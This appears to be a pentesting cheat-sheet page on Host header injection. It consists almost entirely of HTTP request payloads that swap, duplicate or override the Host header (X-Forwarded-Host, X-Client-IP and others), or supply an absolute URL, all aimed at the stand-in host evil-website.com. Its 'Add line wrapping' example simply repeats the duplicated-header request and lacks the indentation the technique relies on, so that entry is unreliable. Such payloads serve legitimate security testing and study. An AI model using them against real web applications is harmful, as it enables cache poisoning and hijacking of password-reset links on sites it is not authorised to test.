---
title: "Host Header Injection"
draft: false
images: []
description: "Host Header Injection Attacks"
lead: "Host Header Injection Attacks"
menu:
  docs:
    parent: "Wapp"
weight: 100
toc: true
---

### Change the host header
```
GET /index.php HTTP/1.1
Host: evil-website.com
...
```
### Duplicating the host header
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```
### Add line wrapping
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
Host: evil-website.com
...
```
### Add host override headers
```
X-Forwarded-For : evil-website.com
X-Forwarded-Host : evil-website.com
X-Client-IP : evil-website.com
X-Remote-IP : evil-website.com
X-Remote-Addr : evil-website.com
X-Host : evil-website.com
```
### X-Forwarded-For : evil.com
```
GET /index.php HTTP/1.1
Host: vulnerable-website.com
X-Forwarded-For : evil-website.com
...
```
### Supply an absolute URL
```
GET https://vulnerable-website.com/ HTTP/1.1
Host: evil-website.com
...
```